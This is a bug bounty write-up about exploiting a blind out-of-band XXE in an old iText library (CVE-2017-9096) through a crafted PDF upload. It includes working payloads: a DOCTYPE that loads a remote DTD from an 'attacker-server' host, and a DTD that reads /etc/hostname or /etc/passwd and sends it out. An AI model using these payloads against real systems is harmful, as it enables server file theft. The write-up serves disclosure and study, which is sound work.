---
layout: ../../layouts/BlogLayout.astro
title: XXE Out-of-Band via a vulnerable iText library through a PDF file upload
description: This article explains how I found an XML External Entity (XXE) injection through a specially crafted PDF file.
tags: ["code", "html"]
time: 4
featured: true
timestamp: 2025-06-23T11:12:03+00:00
filename: xxe-oob-via-a-pdf-upload
---

Hey there! My name's Manuel Valdez, I go by the handles saurinn/saur1n across different bug bounty platforms but I spend my free time hacking on intigriti, mostly. This is my first writeup so go easy on me.

This article explains how I found a Blind XXE via a version of iText which was vulnerable to CVE-2017-9096. This package had been used by a Bug bounty program's stack to handle/extract text and metadata from PDF documents through a file upload feature.


>The scope of this article does not include the definition of XXEs, sorry about that, I'm trying to make this as straightforward as I can, you know, KISS...

<img src="/kiss.gif" alt="kiss gif" width="800" height="300" />

---

My style of hacking is a bit feature-oriented, if I see something interesting or several moving parts working based on a particular functionality, I'm investing my time there. This time I was facing a web application that handles different documents like pictures, .xls and PDF files... Whenever I see some things going on with PDF files I'm definitely taking a look at it. 

There was an upload feature that allowed certain file types: png, jpg, xls, pdf, zip and some others. Uploading images seemed totally fine, clicking on its settings did not show anything interesting either. Then I selected two images and clicked the same settings button (hamburger icon), suddenly a new option showed up: "Merge files". This option combined the two images and embedded them into a single PDF file... Can you smell that right? 

<img src="/fish.gif" alt="kiss gif" width="800" height="300" />

Like I said, images being converted to PDF files seemed pretty interesting to me, especially by taking a look at it and seeing the names of the two images inside the resulting file. 

At this point HTMLi to SSRF came to my mind, it's not a surprise to anyone that follows me on Twitter/X for a while that I love hunting for those but in this case it wasn't that easy <b>at first</b>. I tried a lot of tricks targeting the name of the files to get the HTML injection but what I tried didn't work, I stepped back a little bit and realized I hadn't checked the PDF metadata, classic mistake. 

By looking at the metadata some interesting strings caught me off a bit. Take a look:

<img src="/itext.png" alt="pdf metadata" width="800" height="300" />

Java, iText, some guy named Paulo and some weird looking domain... Alright, being serious we have a lot of interesting bits here:

<b>pdftk-java 3.2.2</b>, an old Java port version of PDFtk, a toolkit for working with PDF files.

<b>itext-paulo-155 (itextpdf.sf.net-lowagie.com)</b>, an iText library part of the PDFtk Java port. Bingo! By looking at the version it was a 20yo version!! 

Btw, Paulo was the main dev from the project and the domain just a mistake by some dev of using the dash char to separate two domains (itextpdf.sf.net and lowagie.com) which we all know that's a no-no (of course someone totally not malicious registered <b>net-lowagie.com</b>, 🐟🎣...)


Anyway, by looking for iText vulns the first google entry pointed me to a High rated vulnerability, XXE, with an CVE assigned to it <b>CVE-2017-9096</b>.

>	The XML parsers in iText before 5.5.12 and 7.x before 7.0.3 do not disable external entities, which might allow remote attackers to conduct XML external entity (XXE) attacks via a crafted PDF.

<b>Crafted PDF</b>... cool, this involves some kind of tweak to a PDF file. Some dorks here and there I ran into a [Github repo](https://github.com/jakabakos/CVE-2017-9096-iText-XXE) with working steps to exploit this CVE.

Followed every step, inserted an XXE code: 

```html
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collab">]>
```

to initally test for an SSRF on the suggested lines, uploaded it to the app and waited for a ping back to my collaborator... Nada... It has to be vulnerable right? Embedding the payload on different sections of the PDF file did nothing different. Changing the controlled host for some other just in case they had a blacklist on [well known OOB domains](https://x.com/saur1n/status/1888591256957210864) but still nothing.

By looking at the sample PDF file used for this exploit with nano (I use nano btw) I had to find some other place to insert the code, searching for the string `<?xml` gave me some matches but on line 741 I saw this:

<img src="/nano.png" alt="pdf metadata" width="800" height="300" />

Alright, let's place it on line 742 then... Uploaded it... and ... wait for it... wait for it... 

<img src="/x.png" alt="pdf metadata" width="800" height="300" />

¡VAMOS! DNS and HTTP interactions.

So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of Java made me tweak a little, it was a pretty updated one. Well, as always it was time to escalate the bug.

Due to the nature of the feature, no direct feedback was available after every upload, therefore an error based XXE was not possible, so I had to go with the Blind route using Out-of-Band attacks to try to exfiltrate internal information.

I had to try different variations of External Parameter entities (an entity referenced inside the DTD). After some trial and error I came up with two working payloads:

#### 1st. payload:

```xml
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://attacker-server/poc.dtd">
%ext;
%ent;
]>
<root>&data;</root>
```

Let's break it down a bit...

The first payload is what I inserted in the PDF file:

1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named `%ext`. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`.

2. `%ext;`: This immediately triggers the parser to process the fetched DTD file.

At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 

#### 2nd. payload:

The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
```
3. `<!ENTITY % file SYSTEM "file:///etc/passwd">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.

4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity %ent, whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.


Back to the 1st. payload:

5. `%ent;`: This line (#3) triggers the processing of the %ent entity from the remote DTD, in simple terms, this action brings the final, exfil command (&data;) into play, setting up the last step of the attack.

6. `<root>&data;</root>`: The parser now resolves the `&data;` general entity. This triggers a final HTTP request to `https://attacker-server`. The content of the `/etc/passwd` file is appended as a URL parameter (`?x=%file;`), and the server sends this request successfully exfiltrating the data to the attacker's controlled domain.



